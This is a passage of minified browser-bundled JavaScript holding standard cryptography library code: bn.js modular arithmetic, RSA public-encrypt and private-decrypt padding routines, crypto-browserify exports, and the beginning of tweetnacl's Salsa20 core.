            function ye() {
                pe.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(ye, pe),
            ye.prototype.split = function(q, L) {
                for (var U = 4194303, Z = Math.min(q.length, 9), te = 0; te < Z; te++)
                    L.words[te] = q.words[te];
                if (L.length = Z,
                q.length <= 9) {
                    q.words[0] = 0,
                    q.length = 1;
                    return
                }
                var se = q.words[9];
                for (L.words[L.length++] = se & U,
                te = 10; te < q.length; te++) {
                    var de = q.words[te] | 0;
                    q.words[te - 10] = (de & U) << 4 | se >>> 22,
                    se = de
                }
                se >>>= 22,
                q.words[te - 10] = se,
                se === 0 && q.length > 10 ? q.length -= 10 : q.length -= 9
            }
            ,
            ye.prototype.imulK = function(q) {
                q.words[q.length] = 0,
                q.words[q.length + 1] = 0,
                q.length += 2;
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = q.words[U] | 0;
                    L += Z * 977,
                    q.words[U] = L & 67108863,
                    L = Z * 64 + (L / 67108864 | 0)
                }
                return q.words[q.length - 1] === 0 && (q.length--,
                q.words[q.length - 1] === 0 && q.length--),
                q
            }
            ;
            function be() {
                pe.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(be, pe);
            function xe() {
                pe.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(xe, pe);
            function Ae() {
                pe.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Ae, pe),
            Ae.prototype.imulK = function(q) {
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = (q.words[U] | 0) * 19 + L
                      , te = Z & 67108863;
                    Z >>>= 26,
                    q.words[U] = te,
                    L = Z
                }
                return L !== 0 && (q.words[q.length++] = L),
                q
            }
            ,
            w._prime = function(q) {
                if (he[q])
                    return he[q];
                var L;
                if (q === "k256")
                    L = new ye;
                else if (q === "p224")
                    L = new be;
                else if (q === "p192")
                    L = new xe;
                else if (q === "p25519")
                    L = new Ae;
                else
                    throw new Error("Unknown prime " + q);
                return he[q] = L,
                L
            }
            ;
            function Ee(ce) {
                if (typeof ce == "string") {
                    var q = w._prime(ce);
                    this.m = q.p,
                    this.prime = q
                } else
                    O(ce.gtn(1), "modulus must be greater than 1"),
                    this.m = ce,
                    this.prime = null
            }
            Ee.prototype._verify1 = function(q) {
                O(q.negative === 0, "red works only with positives"),
                O(q.red, "red works only with red numbers")
            }
            ,
            Ee.prototype._verify2 = function(q, L) {
                O((q.negative | L.negative) === 0, "red works only with positives"),
                O(q.red && q.red === L.red, "red works only with red numbers")
            }
            ,
            Ee.prototype.imod = function(q) {
                return this.prime ? this.prime.ireduce(q)._forceRed(this) : q.umod(this.m)._forceRed(this)
            }
            ,
            Ee.prototype.neg = function(q) {
                return q.isZero() ? q.clone() : this.m.sub(q)._forceRed(this)
            }
            ,
            Ee.prototype.add = function(q, L) {
                this._verify2(q, L);
                var U = q.add(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.iadd = function(q, L) {
                this._verify2(q, L);
                var U = q.iadd(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U
            }
            ,
            Ee.prototype.sub = function(q, L) {
                this._verify2(q, L);
                var U = q.sub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.isub = function(q, L) {
                this._verify2(q, L);
                var U = q.isub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U
            }
            ,
            Ee.prototype.shl = function(q, L) {
                return this._verify1(q),
                this.imod(q.ushln(L))
            }
            ,
            Ee.prototype.imul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.imul(L))
            }
            ,
            Ee.prototype.mul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.mul(L))
            }
            ,
            Ee.prototype.isqr = function(q) {
                return this.imul(q, q.clone())
            }
            ,
            Ee.prototype.sqr = function(q) {
                return this.mul(q, q)
            }
            ,
            Ee.prototype.sqrt = function(q) {
                if (q.isZero())
                    return q.clone();
                var L = this.m.andln(3);
                if (O(L % 2 === 1),
                L === 3) {
                    var U = this.m.add(new w(1)).iushrn(2);
                    return this.pow(q, U)
                }
                for (var Z = this.m.subn(1), te = 0; !Z.isZero() && Z.andln(1) === 0; )
                    te++,
                    Z.iushrn(1);
                O(!Z.isZero());
                var se = new w(1).toRed(this)
                  , de = se.redNeg()
                  , re = this.m.subn(1).iushrn(1)
                  , $ = this.m.bitLength();
                for ($ = new w(2 * $ * $).toRed(this); this.pow($, re).cmp(de) !== 0; )
                    $.redIAdd(de);
                for (var ie = this.pow($, Z), ve = this.pow(q, Z.addn(1).iushrn(1)), ge = this.pow(q, Z), Re = te; ge.cmp(se) !== 0; ) {
                    for (var Pe = ge, Ie = 0; Pe.cmp(se) !== 0; Ie++)
                        Pe = Pe.redSqr();
                    O(Ie < Re);
                    var Te = this.pow(ie, new w(1).iushln(Re - Ie - 1));
                    ve = ve.redMul(Te),
                    ie = Te.redSqr(),
                    ge = ge.redMul(ie),
                    Re = Ie
                }
                return ve
            }
            ,
            Ee.prototype.invm = function(q) {
                var L = q._invmp(this.m);
                return L.negative !== 0 ? (L.negative = 0,
                this.imod(L).redNeg()) : this.imod(L)
            }
            ,
            Ee.prototype.pow = function(q, L) {
                if (L.isZero())
                    return new w(1).toRed(this);
                if (L.cmpn(1) === 0)
                    return q.clone();
                var U = 4
                  , Z = new Array(1 << U);
                Z[0] = new w(1).toRed(this),
                Z[1] = q;
                for (var te = 2; te < Z.length; te++)
                    Z[te] = this.mul(Z[te - 1], q);
                var se = Z[0]
                  , de = 0
                  , re = 0
                  , $ = L.bitLength() % 26;
                for ($ === 0 && ($ = 26),
                te = L.length - 1; te >= 0; te--) {
                    for (var ie = L.words[te], ve = $ - 1; ve >= 0; ve--) {
                        var ge = ie >> ve & 1;
                        if (se !== Z[0] && (se = this.sqr(se)),
                        ge === 0 && de === 0) {
                            re = 0;
                            continue
                        }
                        de <<= 1,
                        de |= ge,
                        re++,
                        !(re !== U && (te !== 0 || ve !== 0)) && (se = this.mul(se, Z[de]),
                        re = 0,
                        de = 0)
                    }
                    $ = 26
                }
                return se
            }
            ,
            Ee.prototype.convertTo = function(q) {
                var L = q.umod(this.m);
                return L === q ? L.clone() : L
            }
            ,
            Ee.prototype.convertFrom = function(q) {
                var L = q.clone();
                return L.red = null,
                L
            }
            ,
            w.mont = function(q) {
                return new Be(q)
            }
            ;
            function Be(ce) {
                Ee.call(this, ce),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(Be, Ee),
            Be.prototype.convertTo = function(q) {
                return this.imod(q.ushln(this.shift))
            }
            ,
            Be.prototype.convertFrom = function(q) {
                var L = this.imod(q.mul(this.rinv));
                return L.red = null,
                L
            }
            ,
            Be.prototype.imul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return q.words[0] = 0,
                    q.length = 1,
                    q;
                var U = q.imul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.mul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return new w(0)._forceRed(this);
                var U = q.mul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.invm = function(q) {
                var L = this.imod(q._invmp(this.m).mul(this.r2));
                return L._forceRed(this)
            }
        }
        )(_, bn)
    }(bn$1)),
    bn$1.exports
}
var withPublic_1, hasRequiredWithPublic;
function requireWithPublic() {
    if (hasRequiredWithPublic)
        return withPublic_1;
    hasRequiredWithPublic = 1;
    var _ = requireBn()
      , M = requireSafeBuffer$1().Buffer;
    function j(O, x) {
        return M.from(O.toRed(_.mont(x.modulus)).redPow(new _(x.publicExponent)).fromRed().toArray())
    }
    return withPublic_1 = j,
    withPublic_1
}
var publicEncrypt, hasRequiredPublicEncrypt;
function requirePublicEncrypt() {
    if (hasRequiredPublicEncrypt)
        return publicEncrypt;
    hasRequiredPublicEncrypt = 1;
    var _ = requireParseAsn1()
      , M = requireBrowser$c()
      , j = requireBrowser$b()
      , O = requireMgf()
      , x = requireXor()
      , w = requireBn()
      , b = requireWithPublic()
      , X = requireBrowserifyRsa()
      , Y = requireSafeBuffer$1().Buffer;
    publicEncrypt = function(ee, ae, ne) {
        var oe;
        ee.padding ? oe = ee.padding : ne ? oe = 1 : oe = 4;
        var ue = _(ee), fe;
        if (oe === 4)
            fe = F(ue, ae);
        else if (oe === 1)
            fe = V(ue, ae, ne);
        else if (oe === 3) {
            if (fe = new w(ae),
            fe.cmp(ue.modulus) >= 0)
                throw new Error("data too long for modulus")
        } else
            throw new Error("unknown padding");
        return ne ? X(fe, ue) : b(fe, ue)
    }
    ;
    function F(Q, ee) {
        var ae = Q.modulus.byteLength()
          , ne = ee.length
          , oe = j("sha1").update(Y.alloc(0)).digest()
          , ue = oe.length
          , fe = 2 * ue;
        if (ne > ae - fe - 2)
            throw new Error("message too long");
        var he = Y.alloc(ae - ne - fe - 2)
          , pe = ae - ue - 1
          , ye = M(ue)
          , be = x(Y.concat([oe, he, Y.alloc(1, 1), ee], pe), O(ye, pe))
          , xe = x(ye, O(be, ue));
        return new w(Y.concat([Y.alloc(1), xe, be], ae))
    }
    function V(Q, ee, ae) {
        var ne = ee.length
          , oe = Q.modulus.byteLength();
        if (ne > oe - 11)
            throw new Error("message too long");
        var ue;
        return ae ? ue = Y.alloc(oe - ne - 3, 255) : ue = K(oe - ne - 3),
        new w(Y.concat([Y.from([0, ae ? 1 : 2]), ue, Y.alloc(1), ee], oe))
    }
    function K(Q) {
        for (var ee = Y.allocUnsafe(Q), ae = 0, ne = M(Q * 2), oe = 0, ue; ae < Q; )
            oe === ne.length && (ne = M(Q * 2),
            oe = 0),
            ue = ne[oe++],
            ue && (ee[ae++] = ue);
        return ee
    }
    return publicEncrypt
}
var privateDecrypt, hasRequiredPrivateDecrypt;
function requirePrivateDecrypt() {
    if (hasRequiredPrivateDecrypt)
        return privateDecrypt;
    hasRequiredPrivateDecrypt = 1;
    var _ = requireParseAsn1()
      , M = requireMgf()
      , j = requireXor()
      , O = requireBn()
      , x = requireBrowserifyRsa()
      , w = requireBrowser$b()
      , b = requireWithPublic()
      , X = requireSafeBuffer$1().Buffer;
    privateDecrypt = function(Q, ee, ae) {
        var ne;
        Q.padding ? ne = Q.padding : ae ? ne = 1 : ne = 4;
        var oe = _(Q)
          , ue = oe.modulus.byteLength();
        if (ee.length > ue || new O(ee).cmp(oe.modulus) >= 0)
            throw new Error("decryption error");
        var fe;
        ae ? fe = b(new O(ee), oe) : fe = x(ee, oe);
        var he = X.alloc(ue - fe.length);
        if (fe = X.concat([he, fe], ue),
        ne === 4)
            return Y(oe, fe);
        if (ne === 1)
            return F(oe, fe, ae);
        if (ne === 3)
            return fe;
        throw new Error("unknown padding")
    }
    ;
    function Y(K, Q) {
        var ee = K.modulus.byteLength()
          , ae = w("sha1").update(X.alloc(0)).digest()
          , ne = ae.length;
        if (Q[0] !== 0)
            throw new Error("decryption error");
        var oe = Q.slice(1, ne + 1)
          , ue = Q.slice(ne + 1)
          , fe = j(oe, M(ue, ne))
          , he = j(ue, M(fe, ee - ne - 1));
        if (V(ae, he.slice(0, ne)))
            throw new Error("decryption error");
        for (var pe = ne; he[pe] === 0; )
            pe++;
        if (he[pe++] !== 1)
            throw new Error("decryption error");
        return he.slice(pe)
    }
    function F(K, Q, ee) {
        for (var ae = Q.slice(0, 2), ne = 2, oe = 0; Q[ne++] !== 0; )
            if (ne >= Q.length) {
                oe++;
                break
            }
        var ue = Q.slice(2, ne - 1);
        if ((ae.toString("hex") !== "0002" && !ee || ae.toString("hex") !== "0001" && ee) && oe++,
        ue.length < 8 && oe++,
        oe)
            throw new Error("decryption error");
        return Q.slice(ne)
    }
    function V(K, Q) {
        K = X.from(K),
        Q = X.from(Q);
        var ee = 0
          , ae = K.length;
        K.length !== Q.length && (ee++,
        ae = Math.min(K.length, Q.length));
        for (var ne = -1; ++ne < ae; )
            ee += K[ne] ^ Q[ne];
        return ee
    }
    return privateDecrypt
}
var hasRequiredBrowser$4;
function requireBrowser$4() {
    return hasRequiredBrowser$4 || (hasRequiredBrowser$4 = 1,
    function(_) {
        _.publicEncrypt = requirePublicEncrypt(),
        _.privateDecrypt = requirePrivateDecrypt(),
        _.privateEncrypt = function(j, O) {
            return _.publicEncrypt(j, O, !0)
        }
        ,
        _.publicDecrypt = function(j, O) {
            return _.privateDecrypt(j, O, !0)
        }
    }(browser$4)),
    browser$4
}
var browser$3 = {}, hasRequiredBrowser$3;
function requireBrowser$3() {
    if (hasRequiredBrowser$3)
        return browser$3;
    hasRequiredBrowser$3 = 1;
    function _() {
        throw new Error(`secure random number generation not supported by this browser
use chrome, FireFox or Internet Explorer 11`)
    }
    var M = requireSafeBuffer$1()
      , j = requireBrowser$c()
      , O = M.Buffer
      , x = M.kMaxLength
      , w = window.crypto || window.msCrypto
      , b = Math.pow(2, 32) - 1;
    function X(Q, ee) {
        if (typeof Q != "number" || Q !== Q)
            throw new TypeError("offset must be a number");
        if (Q > b || Q < 0)
            throw new TypeError("offset must be a uint32");
        if (Q > x || Q > ee)
            throw new RangeError("offset out of range")
    }
    function Y(Q, ee, ae) {
        if (typeof Q != "number" || Q !== Q)
            throw new TypeError("size must be a number");
        if (Q > b || Q < 0)
            throw new TypeError("size must be a uint32");
        if (Q + ee > ae || Q > x)
            throw new RangeError("buffer too small")
    }
    w && w.getRandomValues || !process$1.browser ? (browser$3.randomFill = F,
    browser$3.randomFillSync = K) : (browser$3.randomFill = _,
    browser$3.randomFillSync = _);
    function F(Q, ee, ae, ne) {
        if (!O.isBuffer(Q) && !(Q instanceof window.Uint8Array))
            throw new TypeError('"buf" argument must be a Buffer or Uint8Array');
        if (typeof ee == "function")
            ne = ee,
            ee = 0,
            ae = Q.length;
        else if (typeof ae == "function")
            ne = ae,
            ae = Q.length - ee;
        else if (typeof ne != "function")
            throw new TypeError('"cb" argument must be a function');
        return X(ee, Q.length),
        Y(ae, ee, Q.length),
        V(Q, ee, ae, ne)
    }
    function V(Q, ee, ae, ne) {
        if (process$1.browser) {
            var oe = Q.buffer
              , ue = new Uint8Array(oe,ee,ae);
            if (w.getRandomValues(ue),
            ne) {
                process$1.nextTick(function() {
                    ne(null, Q)
                });
                return
            }
            return Q
        }
        if (ne) {
            j(ae, function(he, pe) {
                if (he)
                    return ne(he);
                pe.copy(Q, ee),
                ne(null, Q)
            });
            return
        }
        var fe = j(ae);
        return fe.copy(Q, ee),
        Q
    }
    function K(Q, ee, ae) {
        if (typeof ee > "u" && (ee = 0),
        !O.isBuffer(Q) && !(Q instanceof window.Uint8Array))
            throw new TypeError('"buf" argument must be a Buffer or Uint8Array');
        return X(ee, Q.length),
        ae === void 0 && (ae = Q.length - ee),
        Y(ae, ee, Q.length),
        V(Q, ee, ae)
    }
    return browser$3
}
var hasRequiredCryptoBrowserify;
function requireCryptoBrowserify() {
    if (hasRequiredCryptoBrowserify)
        return cryptoBrowserify;
    hasRequiredCryptoBrowserify = 1,
    cryptoBrowserify.randomBytes = cryptoBrowserify.rng = cryptoBrowserify.pseudoRandomBytes = cryptoBrowserify.prng = requireBrowser$c(),
    cryptoBrowserify.createHash = cryptoBrowserify.Hash = requireBrowser$b(),
    cryptoBrowserify.createHmac = cryptoBrowserify.Hmac = requireBrowser$d();
    var _ = requireAlgos()
      , M = Object.keys(_)
      , j = ["sha1", "sha224", "sha256", "sha384", "sha512", "md5", "rmd160"].concat(M);
    cryptoBrowserify.getHashes = function() {
        return j
    }
    ;
    var O = requireBrowser$a();
    cryptoBrowserify.pbkdf2 = O.pbkdf2,
    cryptoBrowserify.pbkdf2Sync = O.pbkdf2Sync;
    var x = requireBrowser$8();
    cryptoBrowserify.Cipher = x.Cipher,
    cryptoBrowserify.createCipher = x.createCipher,
    cryptoBrowserify.Cipheriv = x.Cipheriv,
    cryptoBrowserify.createCipheriv = x.createCipheriv,
    cryptoBrowserify.Decipher = x.Decipher,
    cryptoBrowserify.createDecipher = x.createDecipher,
    cryptoBrowserify.Decipheriv = x.Decipheriv,
    cryptoBrowserify.createDecipheriv = x.createDecipheriv,
    cryptoBrowserify.getCiphers = x.getCiphers,
    cryptoBrowserify.listCiphers = x.listCiphers;
    var w = requireBrowser$7();
    cryptoBrowserify.DiffieHellmanGroup = w.DiffieHellmanGroup,
    cryptoBrowserify.createDiffieHellmanGroup = w.createDiffieHellmanGroup,
    cryptoBrowserify.getDiffieHellman = w.getDiffieHellman,
    cryptoBrowserify.createDiffieHellman = w.createDiffieHellman,
    cryptoBrowserify.DiffieHellman = w.DiffieHellman;
    var b = requireBrowser$6();
    cryptoBrowserify.createSign = b.createSign,
    cryptoBrowserify.Sign = b.Sign,
    cryptoBrowserify.createVerify = b.createVerify,
    cryptoBrowserify.Verify = b.Verify,
    cryptoBrowserify.createECDH = requireBrowser$5();
    var X = requireBrowser$4();
    cryptoBrowserify.publicEncrypt = X.publicEncrypt,
    cryptoBrowserify.privateEncrypt = X.privateEncrypt,
    cryptoBrowserify.publicDecrypt = X.publicDecrypt,
    cryptoBrowserify.privateDecrypt = X.privateDecrypt;
    var Y = requireBrowser$3();
    return cryptoBrowserify.randomFill = Y.randomFill,
    cryptoBrowserify.randomFillSync = Y.randomFillSync,
    cryptoBrowserify.createCredentials = function() {
        throw new Error(`sorry, createCredentials is not implemented yet
we accept pull requests
https://github.com/browserify/crypto-browserify`)
    }
    ,
    cryptoBrowserify.constants = {
        DH_CHECK_P_NOT_SAFE_PRIME: 2,
        DH_CHECK_P_NOT_PRIME: 1,
        DH_UNABLE_TO_CHECK_GENERATOR: 4,
        DH_NOT_SUITABLE_GENERATOR: 8,
        NPN_ENABLED: 1,
        ALPN_ENABLED: 1,
        RSA_PKCS1_PADDING: 1,
        RSA_SSLV23_PADDING: 2,
        RSA_NO_PADDING: 3,
        RSA_PKCS1_OAEP_PADDING: 4,
        RSA_X931_PADDING: 5,
        RSA_PKCS1_PSS_PADDING: 6,
        POINT_CONVERSION_COMPRESSED: 2,
        POINT_CONVERSION_UNCOMPRESSED: 4,
        POINT_CONVERSION_HYBRID: 6
    },
    cryptoBrowserify
}
var hasRequiredNaclFast;
function requireNaclFast() {
    return hasRequiredNaclFast || (hasRequiredNaclFast = 1,
    function(_) {
        (function(M) {
            var j = function(Ge) {
                var Ye, it = new Float64Array(16);
                if (Ge)
                    for (Ye = 0; Ye < Ge.length; Ye++)
                        it[Ye] = Ge[Ye];
                return it
            }
              , O = function() {
                throw new Error("no PRNG")
            }
              , x = new Uint8Array(16)
              , w = new Uint8Array(32);
            w[0] = 9;
            var b = j()
              , X = j([1])
              , Y = j([56129, 1])
              , F = j([30883, 4953, 19914, 30187, 55467, 16705, 2637, 112, 59544, 30585, 16505, 36039, 65139, 11119, 27886, 20995])
              , V = j([61785, 9906, 39828, 60374, 45398, 33411, 5274, 224, 53552, 61171, 33010, 6542, 64743, 22239, 55772, 9222])
              , K = j([54554, 36645, 11616, 51542, 42930, 38181, 51040, 26924, 56412, 64982, 57905, 49316, 21502, 52590, 14035, 8553])
              , Q = j([26200, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214, 26214])
              , ee = j([41136, 18958, 6951, 50414, 58488, 44335, 6150, 12099, 55207, 15867, 153, 11085, 57099, 20417, 9344, 11139]);
            function ae(Ge, Ye, it, Fe) {
                Ge[Ye] = it >> 24 & 255,
                Ge[Ye + 1] = it >> 16 & 255,
                Ge[Ye + 2] = it >> 8 & 255,
                Ge[Ye + 3] = it & 255,
                Ge[Ye + 4] = Fe >> 24 & 255,
                Ge[Ye + 5] = Fe >> 16 & 255,
                Ge[Ye + 6] = Fe >> 8 & 255,
                Ge[Ye + 7] = Fe & 255
            }
            function ne(Ge, Ye, it, Fe, ut) {
                var wt, At = 0;
                for (wt = 0; wt < ut; wt++)
                    At |= Ge[Ye + wt] ^ it[Fe + wt];
                return (1 & At - 1 >>> 8) - 1
            }
            function oe(Ge, Ye, it, Fe) {
                return ne(Ge, Ye, it, Fe, 16)
            }
            function ue(Ge, Ye, it, Fe) {
                return ne(Ge, Ye, it, Fe, 32)
            }
            function fe(Ge, Ye, it, Fe) {
                for (var ut = Fe[0] & 255 | (Fe[1] & 255) << 8 | (Fe[2] & 255) << 16 | (Fe[3] & 255) << 24, wt = it[0] & 255 | (it[1] & 255) << 8 | (it[2] & 255) << 16 | (it[3] & 255) << 24, At = it[4] & 255 | (it[5] & 255) << 8 | (it[6] & 255) << 16 | (it[7] & 255) << 24, St = it[8] & 255 | (it[9] & 255) << 8 | (it[10] & 255) << 16 | (it[11] & 255) << 24, Tt = it[12] & 255 | (it[13] & 255) << 8 | (it[14] & 255) << 16 | (it[15] & 255) << 24, er = Fe[4] & 255 | (Fe[5] & 255) << 8 | (Fe[6] & 255) << 16 | (Fe[7] & 255) << 24, Xt = Ye[0] & 255 | (Ye[1] & 255) << 8 | (Ye[2] & 255) << 16 | (Ye[3] & 255) << 24, pr = Ye[4] & 255 | (Ye[5] & 255) << 8 | (Ye[6] & 255) << 16 | (Ye[7] & 255) << 24, or = Ye[8] & 255 | (Ye[9] & 255) << 8 | (Ye[10] & 255) << 16 | (Ye[11] & 255) << 24, yr = Ye[12] & 255 | (Ye[13] & 255) << 8 | (Ye[14] & 255) << 16 | (Ye[15] & 255) << 24, vr = Fe[8] & 255 | (Fe[9] & 255) << 8 | (Fe[10] & 255) << 16 | (Fe[11] & 255) << 24, gr = it[16] & 255 | (it[17] & 255) << 8 | (it[18] & 255) << 16 | (it[19] & 255) << 24, Sr = it[20] & 255 | (it[21] & 255) << 8 | (it[22] & 255) << 16 | (it[23] & 255) << 24, br = it[24] & 255 | (it[25] & 255) << 8 | (it[26] & 255) << 16 | (it[27] & 255) << 24, _r = it[28] & 255 | (it[29] & 255) << 8 | (it[30] & 255) << 16 | (it[31] & 255) << 24, wr = Fe[12] & 255 | (Fe[13] & 255) << 8 | (Fe[14] & 255) << 16 | (Fe[15] & 255) << 24, sr = ut, dr = wt, nr = At, lr = St, fr = Tt, ir = er, $t = Xt, Nt = pr, ar = or, Zt = yr, Gt = vr, ur = gr, Tr = Sr, Or = br, Nr = _r, Br = wr, Rt, Cr = 0; Cr < 20; Cr += 2)
                    Rt = sr + Tr | 0,
                    fr ^= Rt << 7 | Rt >>> 25,
                    Rt = fr + sr | 0,
                    ar ^= Rt << 9 | Rt >>> 23,
                    Rt = ar + fr | 0,
                    Tr ^= Rt << 13 | Rt >>> 19,
                    Rt = Tr + ar | 0,
                    sr ^= Rt << 18 | Rt >>> 14,
                    Rt = ir + dr | 0,
                    Zt ^= Rt << 7 | Rt >>> 25,
                    Rt = Zt + ir | 0,
                    Or ^= Rt << 9 | Rt >>> 23,
                    Rt = Or + Zt | 0,
                    dr ^= Rt << 13 | Rt >>> 19,
                    Rt = dr + Or | 0,
                    ir ^= Rt << 18 | Rt >>> 14,
                    Rt = Gt + $t | 0,
                    Nr ^= Rt << 7 | Rt >>> 25,
                    Rt = Nr + Gt | 0,
                    nr ^= Rt << 9 | Rt >>> 23,
                    Rt = nr + Nr | 0,
                    $t ^= Rt << 13 | Rt >>> 19,
                    Rt = $t + nr | 0,
                    Gt ^= Rt << 18 | Rt >>> 14,
                    Rt = Br + ur | 0,
                    lr ^= Rt << 7 | Rt >>> 25,
                    Rt = lr + Br | 0,
                    Nt ^= Rt << 9 | Rt >>> 23,
                    Rt = Nt + lr | 0,
                    ur ^= Rt << 13 | Rt >>> 19,
                    Rt = ur + Nt | 0,
                    Br ^= Rt << 18 | Rt >>> 14,
                    Rt = sr + lr | 0,
                    dr ^= Rt << 7 | Rt >>> 25,
                    Rt = dr + sr | 0,
                    nr ^= Rt << 9 | Rt >>> 23,
                    Rt = nr + dr | 0,
                    lr ^= Rt << 13 | Rt >>> 19,
                    Rt = lr + nr | 0,
                    sr ^= Rt << 18 | Rt >>> 14,
                    Rt = ir + fr | 0,
                    $t ^= Rt << 7 | Rt >>> 25,
                    Rt = $t + ir | 0,
                    Nt ^= Rt << 9 | Rt >>> 23,
                    Rt = Nt + $t | 0,
                    fr ^= Rt << 13 | Rt >>> 19,
                    Rt = fr + Nt | 0,
                    ir ^= Rt << 18 | Rt >>> 14,
                    Rt = Gt + Zt | 0,
                    ur ^= Rt << 7 | Rt >>> 25,
                    Rt = ur + Gt | 0,
                    ar ^= Rt << 9 | Rt >>> 23,
                    Rt = ar + ur | 0,
                    Zt ^= Rt << 13 | Rt >>> 19,
                    Rt = Zt + ar | 0,
                    Gt ^= Rt << 18 | Rt >>> 14,
                    Rt = Br + Nr | 0,
                    Tr ^= Rt << 7 | Rt >>> 25,
                    Rt = Tr + Br | 0,
                    Or ^= Rt << 9 | Rt >>> 23,
                    Rt = Or + Tr | 0,
                    Nr ^= Rt << 13 | Rt >>> 19,
                    Rt = Nr + Or | 0,
                    Br ^= Rt << 18 | Rt >>> 14;
                sr = sr + ut | 0,
                dr = dr + wt | 0,
                nr = nr + At | 0,
                lr = lr + St | 0,
                fr = fr + Tt | 0,
                ir = ir + er | 0,
                $t = $t + Xt | 0,
                Nt = Nt + pr | 0,
                ar = ar + or | 0,
                Zt = Zt + yr | 0,
                Gt = Gt + vr | 0,
                ur = ur + gr | 0,
                Tr = Tr + Sr | 0,
                Or = Or + br | 0,
                Nr = Nr + _r | 0,
                Br = Br + wr | 0,
                Ge[0] = sr >>> 0 & 255,
                Ge[1] = sr >>> 8 & 255,
                Ge[2] = sr >>> 16 & 255,
                Ge[3] = sr >>> 24 & 255,
                Ge[4] = dr >>> 0 & 255,
                Ge[5] = dr >>> 8 & 255,
                Ge[6] = dr >>> 16 & 255,
                Ge[7] = dr >>> 24 & 255,
                Ge[8] = nr >>> 0 & 255,
                Ge[9] = nr >>> 8 & 255,
                Ge[10] = nr >>> 16 & 255,
                Ge[11] = nr >>> 24 & 255,
                Ge[12] = lr >>> 0 & 255,
                Ge[13] = lr >>> 8 & 255,
                Ge[14] = lr >>> 16 & 255,
                Ge[15] = lr >>> 24 & 255,
                Ge[16] = fr >>> 0 & 255,
                Ge[17] = fr >>> 8 & 255,
                Ge[18] = fr >>> 16 & 255,
                Ge[19] = fr >>> 24 & 255,
                Ge[20] = ir >>> 0 & 255,
                Ge[21] = ir >>> 8 & 255,
                Ge[22] = ir >>> 16 & 255,
                Ge[23] = ir >>> 24 & 255,
                Ge[24] = $t >>> 0 & 255,
                Ge[25] = $t >>> 8 & 255,
                Ge[26] = $t >>> 16 & 255,
                Ge[27] = $t >>> 24 & 255,
                Ge[28] = Nt >>> 0 & 255,
                Ge[29] = Nt >>> 8 & 255,
                Ge[30] = Nt >>> 16 & 255,
                Ge[31] = Nt >>> 24 & 255,
                Ge[32] = ar >>> 0 & 255,
                Ge[33] = ar >>> 8 & 255,
                Ge[34] = ar >>> 16 & 255,
                Ge[35] = ar >>> 24 & 255,
                Ge[36] = Zt >>> 0 & 255,
                Ge[37] = Zt >>> 8 & 255,
                Ge[38] = Zt >>> 16 & 255,
                Ge[39] = Zt >>> 24 & 255,
                Ge[40] = Gt >>> 0 & 255,
                Ge[41] = Gt >>> 8 & 255,
                Ge[42] = Gt >>> 16 & 255,
                Ge[43] = Gt >>> 24 & 255,
                Ge[44] = ur >>> 0 & 255,
                Ge[45] = ur >>> 8 & 255,
                Ge[46] = ur >>> 16 & 255,
                Ge[47] = ur >>> 24 & 255,
                Ge[48] = Tr >>> 0 & 255,
                Ge[49] = Tr >>> 8 & 255,
                Ge[50] = Tr >>> 16 & 255,
                Ge[51] = Tr >>> 24 & 255,
                Ge[52] = Or >>> 0 & 255,
                Ge[53] = Or >>> 8 & 255,
                Ge[54] = Or >>> 16 & 255,
                Ge[55] = Or >>> 24 & 255,
                Ge[56] = Nr >>> 0 & 255,
                Ge[57] = Nr >>> 8 & 255,
                Ge[58] = Nr >>> 16 & 255,
                Ge[59] = Nr >>> 24 & 255,
                Ge[60] = Br >>> 0 & 255,
                Ge[61] = Br >>> 8 & 255,
                Ge[62] = Br >>> 16 & 255,
                Ge[63] = Br >>> 24 & 255
            }
            function he(Ge, Ye, it, Fe) {
